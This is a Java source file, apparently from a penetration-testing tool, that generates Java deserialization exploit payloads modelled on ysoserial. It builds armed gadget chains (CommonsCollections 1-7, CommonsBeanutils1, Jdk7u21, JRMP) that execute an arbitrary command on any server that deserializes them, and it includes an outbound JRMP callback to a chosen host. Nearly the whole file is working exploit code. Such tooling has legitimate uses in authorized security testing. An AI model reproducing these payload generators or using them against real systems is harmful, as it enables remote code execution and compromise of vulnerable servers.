package com.omnistrike.modules.injection.deser;

import java.io.*;
import java.lang.reflect.*;
import java.math.BigInteger;
import java.net.URL;
import java.lang.reflect.Field;
import java.rmi.registry.Registry;
import java.rmi.server.ObjID;
import java.rmi.server.RemoteObjectInvocationHandler;
import java.rmi.server.RemoteRef;
import java.util.*;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import javax.xml.transform.Templates;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.beanutils.BeanComparator;

/**
 * Java deserialization payload generators — comprehensive ysoserial coverage.
 *
 * Tier 1 chains (CC1-CC7, CB1) construct REAL Java objects using the actual
 * vulnerable library classes, wire them via reflection, and serialize with
 * ObjectOutputStream. These produce structurally valid serialized streams.
 *
 * Tier 2 chains (Jdk7u21, JRMPClient, JRMPListener) use JDK-only classes.
 *
 * Tier 3 chains (Spring, Hibernate, etc.) require libraries not bundled here;
 * they throw UnsupportedOperationException with guidance to use ysoserial CLI.
 *
 * URLDNS is fully native (HashMap + URL, zero external deps).
 */
public final class JavaPayloads {

    private JavaPayloads() {}

    public static Map<String, String> getChains() {
        Map<String, String> chains = new LinkedHashMap<>();

        // ── DNS / Safe callbacks ────────────────────────────────────────────
        chains.put("URLDNS", "DNS lookup via HashMap+URL — no deps, safe recon (Command = callback URL/domain)");
        chains.put("DNSCallback", "DNS-only callback — alias for URLDNS (Command = callback URL/domain)");

        // ── Commons Collections chains (ascending order) ─────────────────────
        chains.put("CommonsCollections1", "LazyMap+ChainedTransformer+InvokerTransformer → Runtime.exec (CC 3.1, JDK<8u72)");
        chains.put("CommonsCollections2", "PriorityQueue+TransformingComparator+InvokerTransformer → Runtime.exec (CC 4.0)");
        chains.put("CommonsCollections3", "LazyMap+ChainedTransformer+InstantiateTransformer+TrAXFilter → Runtime.exec (CC 3.1, JDK<8u72)");
        chains.put("CommonsCollections4", "PriorityQueue+TransformingComparator+InstantiateTransformer+TrAXFilter → Runtime.exec (CC 4.0)");
        chains.put("CommonsCollections5", "BadAttributeValueExpException+TiedMapEntry+LazyMap → Runtime.exec (CC 3.1)");
        chains.put("CommonsCollections6", "HashSet+TiedMapEntry+LazyMap → Runtime.exec (CC 3.1)");
        chains.put("CommonsCollections7", "Hashtable+LazyMap collision → Runtime.exec (CC 3.1)");

        // ── Commons Beanutils ───────────────────────────────────────────────
        chains.put("CommonsBeanutils1", "PriorityQueue+BeanComparator → Runtime.exec (commons-beanutils 1.x + CC)");
        chains.put("CommonsBeanutils1_183", "PriorityQueue+BeanComparator → Runtime.exec (commons-beanutils 1.8.3+, no CC dep)");

        // ── Spring Framework ────────────────────────────────────────────────
        chains.put("Spring1", "SerializableTypeWrapper+ObjectFactoryDelegatingInvocationHandler → Runtime.exec (Spring Core)");
        chains.put("Spring2", "JdkDynamicAopProxy+AnnotationInvocationHandler → Runtime.exec (Spring AOP + JDK<8u72)");

        // ── Hibernate ───────────────────────────────────────────────────────
        chains.put("Hibernate1", "HashMap+BasicLazyInitializer+AbstractComponentTuplizer → Runtime.exec (Hibernate 5)");
        chains.put("Hibernate2", "HashMap+BasicLazyInitializer+PojoComponentTuplizer → Runtime.exec (Hibernate 5, alt trigger)");

        // ── Groovy ──────────────────────────────────────────────────────────
        chains.put("Groovy1", "ConvertedClosure+MethodClosure → Runtime.exec (Groovy 2.3-2.4)");

        // ── JDK built-in ────────────────────────────────────────────────────
        chains.put("Jdk7u21", "LinkedHashSet+Templates proxy → Runtime.exec (JDK 7u21 and below, no deps)");

        // ── JRMP ────────────────────────────────────────────────────────────
        chains.put("JRMPClient", "UnicastRef+Registry → JRMP outbound call (Command = host:port)");
        chains.put("JRMPListener", "UnicastRemoteObject → starts JRMP listener (Command = port)");

        // ── JNDI ────────────────────────────────────────────────────────────
        chains.put("JNDIExploit", "JNDI InitialContext.lookup → RCE via remote classloading (Command = ldap://host/a)");

        // ── ROME RSS library ────────────────────────────────────────────────
        chains.put("ROME", "HashMap+ObjectBean+ToStringBean+EqualsBean → Runtime.exec (ROME 1.0)");

        // ── BeanShell ───────────────────────────────────────────────────────
        chains.put("BeanShell1", "PriorityQueue+Comparator via BeanShell Interpreter → Runtime.exec (bsh 2.0b5)");

        // ── C3P0 ────────────────────────────────────────────────────────────
        chains.put("C3P0", "PoolBackedDataSource+JNDI reference → remote classloading (Command = http://host/Exploit)");

        // ── Apache Click ────────────────────────────────────────────────────
        chains.put("Click1", "PriorityQueue+Column$ColumnComparator → Runtime.exec (Apache Click 2.3)");

        // ── FileUpload ──────────────────────────────────────────────────────
        chains.put("FileUpload1", "DiskFileItem → arbitrary file write (commons-fileupload 1.3.1, Command = path:content)");

        // ── JBoss Interceptors ──────────────────────────────────────────────
        chains.put("JBossInterceptors1", "JBoss interceptor chain+Weld → Runtime.exec (JBoss AS/WildFly)");

        // ── Javassist / Weld CDI ────────────────────────────────────────────
        chains.put("JavassistWeld1", "CDI Weld+Javassist proxy → Runtime.exec (Weld CDI + Javassist)");

        // ── JSON (Spring) ───────────────────────────────────────────────────
        chains.put("JSON1", "Spring AOP+Jackson/JSON gadgets → Runtime.exec (Spring 4.x + JDK<8u72)");

        // ── Jython ──────────────────────────────────────────────────────────
        chains.put("Jython1", "PyObject+PythonInterpreter → Runtime.exec (Jython 2.5-2.7)");

        // ── Mozilla Rhino ───────────────────────────────────────────────────
        chains.put("MozillaRhino1", "NativeError+NativeJavaObject → Runtime.exec (Rhino 1.7r2, JDK 6/7)");
        chains.put("MozillaRhino2", "NativeJavaObject+ScriptableObject → Runtime.exec (Rhino 1.7r2, alt trigger)");

        // ── MyFaces ─────────────────────────────────────────────────────────
        chains.put("Myfaces1", "MyFaces ViewState+ValueExpression → Runtime.exec (MyFaces 1.2-2.x)");
        chains.put("Myfaces2", "MyFaces ViewState+MethodExpression → Runtime.exec (MyFaces 2.x, alt trigger)");

        // ── Vaadin ──────────────────────────────────────────────────────────
        chains.put("Vaadin1", "PropertysetItem+NestedMethodProperty → Runtime.exec (Vaadin 7.x)");

        // ── Wicket ──────────────────────────────────────────────────────────
        chains.put("Wicket1", "DiskFileItem → arbitrary file write (Wicket commons-fileupload fork)");

        // ── Clojure ─────────────────────────────────────────────────────────
        chains.put("Clojure", "HashMap+AbstractTableModel$ff → Runtime.exec (Clojure 1.2+)");

        return chains;
    }

    public static byte[] generate(String chain, String command) {
        try {
            return switch (chain) {
                // DNS / safe
                case "URLDNS", "DNSCallback"     -> generateUrldns(command);

                // Commons Collections 3.x — real object construction
                case "CommonsCollections1"        -> generateCC1(command);
                case "CommonsCollections3"        -> generateCC3(command);
                case "CommonsCollections5"        -> generateCC5(command);
                case "CommonsCollections6"        -> generateCC6(command);
                case "CommonsCollections7"        -> generateCC7(command);

                // Commons Collections 4.x — real object construction
                case "CommonsCollections2"        -> generateCC2(command);
                case "CommonsCollections4"        -> generateCC4(command);

                // Commons Beanutils — real object construction
                case "CommonsBeanutils1"          -> generateCB1(command);
                case "CommonsBeanutils1_183"      -> generateCB1_183(command);

                // JDK built-in — real object construction
                case "Jdk7u21"                    -> generateJdk7u21(command);

                // JRMP — real object construction
                case "JRMPClient"                 -> generateJRMPClient(command);
                case "JRMPListener"               -> generateJRMPListener(command);

                // Tier 3 — require libraries not bundled
                case "Spring1"                    -> unsupported(chain, "Spring Framework");
                case "Spring2"                    -> unsupported(chain, "Spring AOP");
                case "Hibernate1"                 -> unsupported(chain, "Hibernate 5");
                case "Hibernate2"                 -> unsupported(chain, "Hibernate 5");
                case "Groovy1"                    -> unsupported(chain, "Groovy 2.3-2.4");
                case "JNDIExploit"                -> unsupported(chain, "JNDI (use JRMPClient for similar effect)");
                case "ROME"                       -> unsupported(chain, "ROME 1.0");
                case "BeanShell1"                 -> unsupported(chain, "BeanShell 2.0b5");
                case "C3P0"                       -> unsupported(chain, "C3P0");
                case "Click1"                     -> unsupported(chain, "Apache Click 2.3");
                case "FileUpload1"                -> unsupported(chain, "commons-fileupload 1.3.1");
                case "JBossInterceptors1"         -> unsupported(chain, "JBoss Interceptors");
                case "JavassistWeld1"             -> unsupported(chain, "Weld CDI");
                case "JSON1"                      -> unsupported(chain, "Spring + json-lib");
                case "Jython1"                    -> unsupported(chain, "Jython 2.5-2.7");
                case "MozillaRhino1"              -> unsupported(chain, "Mozilla Rhino 1.7r2");
                case "MozillaRhino2"              -> unsupported(chain, "Mozilla Rhino 1.7r2");
                case "Myfaces1"                   -> unsupported(chain, "MyFaces 1.2-2.x");
                case "Myfaces2"                   -> unsupported(chain, "MyFaces 2.x");
                case "Vaadin1"                    -> unsupported(chain, "Vaadin 7.x");
                case "Wicket1"                    -> unsupported(chain, "Wicket commons-fileupload");
                case "Clojure"                    -> unsupported(chain, "Clojure 1.2+");

                default -> throw new IllegalArgumentException("Unknown Java chain: " + chain);
            };
        } catch (UnsupportedOperationException e) {
            throw e;
        } catch (Exception e) {
            throw new RuntimeException(chain + " generation failed: " + e.getMessage(), e);
        }
    }

    private static byte[] unsupported(String chain, String library) {
        throw new UnsupportedOperationException(
                "Chain '" + chain + "' requires " + library +
                " on classpath — use ysoserial CLI for this chain");
    }

    // ════════════════════════════════════════════════════════════════════════
    //  URLDNS — Fully native, zero dependencies
    // ════════════════════════════════════════════════════════════════════════

    private static byte[] generateUrldns(String callbackUrl) throws Exception {
        String target = toValidUrl(callbackUrl);
        URL url = new URL(target);

        // Prevent DNS during put() — set hashCode to any value != -1
        java.lang.reflect.Field hashCodeField = URL.class.getDeclaredField("hashCode");
        hashCodeField.setAccessible(true);
        hashCodeField.setInt(url, 0xCAFE);

        HashMap<URL, String> hashMap = new HashMap<>();
        hashMap.put(url, "omnistrike");

        // Reset to -1 so deserialization triggers hashCode() → DNS lookup
        hashCodeField.setInt(url, -1);

        return ReflectionUtils.serialize(hashMap);
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Commons Collections 3.x chains (require commons-collections 3.1)
    // ════════════════════════════════════════════════════════════════════════

    /**
     * CC1: AnnotationInvocationHandler proxy → LazyMap → ChainedTransformer → InvokerTransformer chain.
     * Requires CC 3.1 and JDK < 8u72 (AnnotationInvocationHandler patched in 8u72).
     *
     * Deferred arming: build with inert chain, wire objects, then swap in real transformers.
     */
    @SuppressWarnings("unchecked")
    private static byte[] generateCC1(String command) throws Exception {
        Transformer[] realTransformers = GadgetUtils.makeTransformerChain(command);
        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();

        Map<String, String> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(innerMap, fakeChain);

        // AnnotationInvocationHandler proxy → LazyMap
        Constructor<?> aihCtor = ReflectionUtils.getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler");
        InvocationHandler aih = (InvocationHandler) aihCtor.newInstance(Override.class, lazyMap);

        Map proxyMap = (Map) Proxy.newProxyInstance(
                JavaPayloads.class.getClassLoader(), new Class[]{Map.class}, aih);

        // Outer AnnotationInvocationHandler wrapping the proxy
        InvocationHandler handler = (InvocationHandler) aihCtor.newInstance(Override.class, proxyMap);

        // Arm: swap in real transformer chain
        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);

        return ReflectionUtils.serialize(handler);
    }

    /**
     * CC3: AnnotationInvocationHandler proxy → LazyMap → ChainedTransformer
     *      → InstantiateTransformer(TrAXFilter) → TemplatesImpl bytecode.
     * Requires CC 3.1 and JDK < 8u72.
     */
    @SuppressWarnings("unchecked")
    private static byte[] generateCC3(String command) throws Exception {
        Object templates = GadgetUtils.createTemplatesImpl(command);
        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();

        Map<String, String> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(innerMap, fakeChain);

        Constructor<?> aihCtor = ReflectionUtils.getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler");
        InvocationHandler aih = (InvocationHandler) aihCtor.newInstance(Override.class, lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(
                JavaPayloads.class.getClassLoader(), new Class[]{Map.class}, aih);
        InvocationHandler handler = (InvocationHandler) aihCtor.newInstance(Override.class, proxyMap);

        // Arm: TrAXFilter constructor takes Templates → calls newTransformer() → evil bytecode
        Class<?> traxFilterClass = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");
        Transformer[] realTransformers = new Transformer[]{
                new ConstantTransformer(traxFilterClass),
                new InstantiateTransformer(
                        new Class[]{Templates.class}, new Object[]{templates}),
                new ConstantTransformer(1)
        };
        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);

        return ReflectionUtils.serialize(handler);
    }

    /**
     * CC5: BadAttributeValueExpException → TiedMapEntry → LazyMap → InvokerTransformer chain.
     * Requires CC 3.1. Works on JDK 8+ (no AnnotationInvocationHandler needed).
     */
    @SuppressWarnings("unchecked")
    private static byte[] generateCC5(String command) throws Exception {
        Transformer[] realTransformers = GadgetUtils.makeTransformerChain(command);
        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();

        Map<String, String> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(innerMap, fakeChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        // BadAttributeValueExpException.readObject → val.toString → TiedMapEntry.toString
        // → TiedMapEntry.getValue → LazyMap.get → ChainedTransformer
        javax.management.BadAttributeValueExpException val =
                new javax.management.BadAttributeValueExpException(null);
        ReflectionUtils.setFieldValue(val, "val", entry);

        // Arm
        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);

        return ReflectionUtils.serialize(val);
    }

    /**
     * CC6: HashSet → HashMap → TiedMapEntry.hashCode → LazyMap.get → InvokerTransformer chain.
     * Requires CC 3.1. Works on all JDK versions (no AIH needed).
     */
    @SuppressWarnings("unchecked")
    private static byte[] generateCC6(String command) throws Exception {
        Transformer[] realTransformers = GadgetUtils.makeTransformerChain(command);
        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();

        Map<String, String> innerMap = new HashMap<>();
        Map lazyMap = LazyMap.decorate(innerMap, fakeChain);

        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

        HashSet<Object> set = new HashSet<>(1);
        set.add("foo");

        // Get HashSet's internal HashMap, then replace the key with our TiedMapEntry
        Field mapField = HashSet.class.getDeclaredField("map");
        mapField.setAccessible(true);
        HashMap<Object, Object> hsMap = (HashMap<Object, Object>) mapField.get(set);

        Field tableField = HashMap.class.getDeclaredField("table");
        tableField.setAccessible(true);
        Object[] table = (Object[]) tableField.get(hsMap);

        // Find the non-null node and replace its key
        for (Object node : table) {
            if (node != null) {
                Field keyField = node.getClass().getDeclaredField("key");
                keyField.setAccessible(true);
                keyField.set(node, entry);
                break;
            }
        }

        // Arm
        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);

        return ReflectionUtils.serialize(set);
    }

    /**
     * CC7: Hashtable collision ("yy"/"zZ") → LazyMap.equals → LazyMap.get → InvokerTransformer chain.
     * Requires CC 3.1. Works on all JDK versions.
     *
     * "yy" and "zZ" have the same hashCode (3872), causing a hash collision in Hashtable.
     * During reconstitutionPut, Hashtable calls equals() on the colliding keys,
     * which triggers LazyMap.get → ChainedTransformer.
     */
    @SuppressWarnings("unchecked")
    private static byte[] generateCC7(String command) throws Exception {
        Transformer[] realTransformers = GadgetUtils.makeTransformerChain(command);
        ChainedTransformer fakeChain = GadgetUtils.makeInertChain();

        Map<String, String> innerMap1 = new HashMap<>();
        Map<String, String> innerMap2 = new HashMap<>();
        Map lazyMap1 = LazyMap.decorate(innerMap1, fakeChain);
        Map lazyMap2 = LazyMap.decorate(innerMap2, fakeChain);

        lazyMap1.put("yy", "1");
        lazyMap2.put("zZ", "1");

        Hashtable<Object, Object> hashtable = new Hashtable<>();
        hashtable.put(lazyMap1, "1");
        hashtable.put(lazyMap2, "2");

        // The second put() triggers collision → lazyMap2 gets an extra "yy" entry; remove it
        lazyMap2.remove("yy");

        // Arm
        ReflectionUtils.setFieldValue(fakeChain, "iTransformers", realTransformers);

        return ReflectionUtils.serialize(hashtable);
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Commons Collections 4.x chains (require commons-collections4 4.0)
    // ════════════════════════════════════════════════════════════════════════

    /**
     * CC2: PriorityQueue → TransformingComparator → InvokerTransformer("newTransformer")
     *      → TemplatesImpl bytecode.
     * Requires CC4 4.0.
     */
    private static byte[] generateCC2(String command) throws Exception {
        Object templates = GadgetUtils.createTemplatesImpl(command);

        // CC4's InvokerTransformer — start with inert "toString"
        // Raw types — CC4 4.0 generics vary between versions
        @SuppressWarnings({"unchecked", "rawtypes"})
        org.apache.commons.collections4.functors.InvokerTransformer invoker =
                new org.apache.commons.collections4.functors.InvokerTransformer(
                        "toString", new Class[0], new Object[0]);

        @SuppressWarnings({"unchecked", "rawtypes"})
        org.apache.commons.collections4.comparators.TransformingComparator comp =
                new org.apache.commons.collections4.comparators.TransformingComparator(invoker);

        PriorityQueue<Object> queue = new PriorityQueue<>(2, comp);
        queue.add(1);
        queue.add(1);

        // Arm: swap queue contents and transformer method
        ReflectionUtils.setFieldValue(invoker, "iMethodName", "newTransformer");
        Object[] queueArray = (Object[]) ReflectionUtils.getFieldValue(queue, "queue");
        queueArray[0] = templates;
        queueArray[1] = 1;

        return ReflectionUtils.serialize(queue);
    }

    /**
     * CC4: PriorityQueue → TransformingComparator → ChainedTransformer
     *      → [ConstantTransformer(TrAXFilter) + InstantiateTransformer(Templates)] → TemplatesImpl.
     * Requires CC4 4.0.
     */
    @SuppressWarnings({"unchecked", "rawtypes"})
    private static byte[] generateCC4(String command) throws Exception {
        Object templates = GadgetUtils.createTemplatesImpl(command);
        Class<?> traxFilterClass = Class.forName(
                "com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter");

        // Phase 1: Use a throwaway inert transformer for safe queue population.
        // ConstantTransformer("1") returns a Comparable String so compare() works.
        org.apache.commons.collections4.functors.ConstantTransformer inert =
                new org.apache.commons.collections4.functors.ConstantTransformer("1");

        org.apache.commons.collections4.comparators.TransformingComparator comp =
                new org.apache.commons.collections4.comparators.TransformingComparator(inert);

        PriorityQueue<Object> queue = new PriorityQueue<>(2, comp);
        queue.add(1);
        queue.add(1);

        // Phase 2: Build the real chain with FRESH objects (no shared refs with inert).
        // On deserialization: ConstantTransformer(TrAXFilter.class) ignores queue element,
        // returns TrAXFilter.class → InstantiateTransformer creates new TrAXFilter(templates)
        // → TrAXFilter constructor calls templates.newTransformer() → evil bytecode runs.
        org.apache.commons.collections4.functors.ConstantTransformer constant =
                new org.apache.commons.collections4.functors.ConstantTransformer(traxFilterClass);

        org.apache.commons.collections4.functors.InstantiateTransformer instantiate =
                new org.apache.commons.collections4.functors.InstantiateTransformer(
                        new Class[]{Templates.class}, new Object[]{templates});

        org.apache.commons.collections4.functors.ChainedTransformer realChain =
                new org.apache.commons.collections4.functors.ChainedTransformer(
                        new org.apache.commons.collections4.Transformer[]{constant, instantiate});

        // Phase 3: Arm — swap comparator's transformer to real chain.
        // Queue elements stay as Integer(1) — ConstantTransformer ignores them.
        ReflectionUtils.setFieldValue(comp, "transformer", realChain);

        return ReflectionUtils.serialize(queue);
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Commons Beanutils
    // ════════════════════════════════════════════════════════════════════════

    /**
     * CB1: PriorityQueue → BeanComparator("outputProperties") → TemplatesImpl.
     * Requires commons-beanutils 1.x + commons-collections on classpath.
     *
     * BeanComparator calls PropertyUtils.getProperty(obj, "outputProperties")
     * → TemplatesImpl.getOutputProperties() → newTransformer() → evil bytecode.
     */
    private static byte[] generateCB1(String command) throws Exception {
        Object templates = GadgetUtils.createTemplatesImpl(command);

        // Use "lowestSetBit" as inert property (BigInteger has this getter)
        BeanComparator<Object> comparator = new BeanComparator<>("lowestSetBit");

        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));

        // Arm: swap property to "outputProperties" and queue contents to TemplatesImpl
        ReflectionUtils.setFieldValue(comparator, "property", "outputProperties");
        ReflectionUtils.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return ReflectionUtils.serialize(queue);
    }

    /**
     * CB1_183: Same as CB1 but uses an explicit java.util Comparator instead of
     * CC's ComparableComparator, so it works without commons-collections on classpath.
     */
    private static byte[] generateCB1_183(String command) throws Exception {
        Object templates = GadgetUtils.createTemplatesImpl(command);

        // Provide an explicit Comparator to avoid CC dependency
        BeanComparator<Object> comparator = new BeanComparator<>(null,
                String.CASE_INSENSITIVE_ORDER);

        PriorityQueue<Object> queue = new PriorityQueue<>(2, comparator);
        queue.add("a");
        queue.add("b");

        // Arm
        ReflectionUtils.setFieldValue(comparator, "property", "outputProperties");
        ReflectionUtils.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return ReflectionUtils.serialize(queue);
    }

    // ════════════════════════════════════════════════════════════════════════
    //  JDK built-in — Jdk7u21
    // ════════════════════════════════════════════════════════════════════════

    /**
     * Jdk7u21: LinkedHashSet + TemplatesImpl + AnnotationInvocationHandler proxy.
     * No external dependencies. Requires JDK 7u21 or below.
     *
     * The trick: "f5a5a608".hashCode() == 0, so proxy.hashCode = 0 ^ value.hashCode
     * = value.hashCode. After adding both to the set, swap value to templates so
     * proxy.hashCode == templates.hashCode at deserialization time → hash collision
     * → proxy.equals(templates) → equalsImpl → getOutputProperties() → RCE.
     */
    private static byte[] generateJdk7u21(String command) throws Exception {
        Object templates = GadgetUtils.createTemplatesImpl(command);

        // "f5a5a608" has hashCode 0
        String zeroHashCodeStr = "f5a5a608";
        HashMap<String, Object> map = new HashMap<>();
        map.put(zeroHashCodeStr, "foo");

        Constructor<?> aihCtor = ReflectionUtils.getFirstCtor(
                "sun.reflect.annotation.AnnotationInvocationHandler");
        InvocationHandler handler = (InvocationHandler) aihCtor.newInstance(Templates.class, map);

        Templates proxy = (Templates) Proxy.newProxyInstance(
                JavaPayloads.class.getClassLoader(),
                new Class[]{Templates.class},
                handler);

        LinkedHashSet<Object> set = new LinkedHashSet<>();
        set.add(templates);
        set.add(proxy);

        // Arm: swap map value to templates (after adding to set to avoid premature trigger)
        map.put(zeroHashCodeStr, templates);

        return ReflectionUtils.serialize(set);
    }

    // ════════════════════════════════════════════════════════════════════════
    //  JRMP
    // ════════════════════════════════════════════════════════════════════════

    /**
     * JRMPClient: Construct a Registry proxy with UnicastRef pointing to host:port.
     * On deserialization, triggers an outbound JRMP call to the specified endpoint.
     * Command format: host:port (default port 1099).
     */
    private static byte[] generateJRMPClient(String command) throws Exception {
        // Ensure modules are opened (triggers ReflectionUtils static init)
        ReflectionUtils.getUnsafe();

        String host = command;
        int port = 1099;
        if (command.contains(":")) {
            String[] parts = command.split(":", 2);
            host = parts[0];
            try { port = Integer.parseInt(parts[1].trim()); } catch (NumberFormatException ignored) {}
        }

        ObjID id = new ObjID(new Random().nextInt());

        // Construct TCPEndpoint via reflection (modules opened by ReflectionUtils)
        Class<?> tcpEndpointClass = Class.forName("sun.rmi.transport.tcp.TCPEndpoint");
        Constructor<?> tcpCtor = tcpEndpointClass.getDeclaredConstructor(String.class, int.class);
        tcpCtor.setAccessible(true);
        Object tcpEndpoint = tcpCtor.newInstance(host, port);

        // Construct LiveRef via reflection
        Class<?> liveRefClass = Class.forName("sun.rmi.transport.LiveRef");
        Constructor<?> liveRefCtor = liveRefClass.getDeclaredConstructor(
                ObjID.class, Class.forName("sun.rmi.transport.Endpoint"), boolean.class);
        liveRefCtor.setAccessible(true);
        Object liveRef = liveRefCtor.newInstance(id, tcpEndpoint, false);

        // Construct UnicastRef via reflection
        Class<?> unicastRefClass = Class.forName("sun.rmi.server.UnicastRef");
        Constructor<?> unicastRefCtor = unicastRefClass.getDeclaredConstructor(liveRefClass);
        unicastRefCtor.setAccessible(true);
        RemoteRef unicastRef = (RemoteRef) unicastRefCtor.newInstance(liveRef);

        RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(unicastRef);
        Registry proxy = (Registry) Proxy.newProxyInstance(
                Registry.class.getClassLoader(),
                new Class[]{Registry.class},
                obj);

        return ReflectionUtils.serialize(proxy);
    }

    /**
     * JRMPListener: Construct a UnicastRemoteObject that opens a JRMP listener.
     * Command format: port number.
     */
    private static byte[] generateJRMPListener(String command) throws Exception {
        ReflectionUtils.getUnsafe();
        int port = 1099;
        try { port = Integer.parseInt(command.trim()); } catch (NumberFormatException ignored) {}

        Class<?> uroClass = java.rmi.server.UnicastRemoteObject.class;
        Object uro = ReflectionUtils.createWithoutConstructor(uroClass);
        ReflectionUtils.setFieldValue(uro, "port", port);

        // Build UnicastServerRef with LiveRef so RemoteObject.writeObject() works
        Class<?> liveRefClass = Class.forName("sun.rmi.transport.LiveRef");
        java.lang.reflect.Constructor<?> liveRefCtor = liveRefClass.getDeclaredConstructor(int.class);
        liveRefCtor.setAccessible(true);
        Object liveRef = liveRefCtor.newInstance(port);

        Class<?> usrClass = Class.forName("sun.rmi.server.UnicastServerRef");
        java.lang.reflect.Constructor<?> usrCtor = usrClass.getDeclaredConstructor(liveRefClass);
        usrCtor.setAccessible(true);
        Object usr = usrCtor.newInstance(liveRef);

        ReflectionUtils.setFieldValue(uro, "ref", usr);

        return ReflectionUtils.serialize((Serializable) uro);
    }

    // ════════════════════════════════════════════════════════════════════════
    //  Helper methods
    // ════════════════════════════════════════════════════════════════════════

    /** Find first occurrence of needle in haystack starting at fromIndex. */
    private static int indexOf(byte[] haystack, byte[] needle, int fromIndex) {
        outer:
        for (int i = fromIndex; i <= haystack.length - needle.length; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (haystack[i + j] != needle[j]) continue outer;
            }
            return i;
        }
        return -1;
    }

    /** Sanitise arbitrary user input into a valid URL for URLDNS/DNSCallback. */
    private static String toValidUrl(String input) {
        if (input == null || input.isBlank()) {
            return "http://omnistrike.dns";
        }
        String trimmed = input.trim();
        if (trimmed.matches("^https?://[\\w.:-]+.*")) return trimmed;
        Matcher urlMatcher = Pattern.compile("https?://[\\w.:/-]+").matcher(trimmed);
        if (urlMatcher.find()) return urlMatcher.group();
        if (trimmed.matches("^[a-zA-Z0-9]([a-zA-Z0-9._-]*[a-zA-Z0-9])?$")) return "http://" + trimmed;
        String sanitised = trimmed.replaceAll("[^a-zA-Z0-9.-]", "-")
                                  .replaceAll("-{2,}", "-")
                                  .replaceAll("^-|-$", "");
        if (sanitised.isEmpty()) sanitised = "payload";
        if (sanitised.length() > 63) sanitised = sanitised.substring(0, 63);
        return "http://" + sanitised + ".omnistrike.dns";
    }

    static byte[] hexToBytes(String hex) {
        hex = hex.replaceAll("\\s+", "");
        byte[] bytes = new byte[hex.length() / 2];
        for (int i = 0; i < bytes.length; i++) {
            bytes[i] = (byte) Integer.parseInt(hex.substring(i * 2, i * 2 + 2), 16);
        }
        return bytes;
    }
}
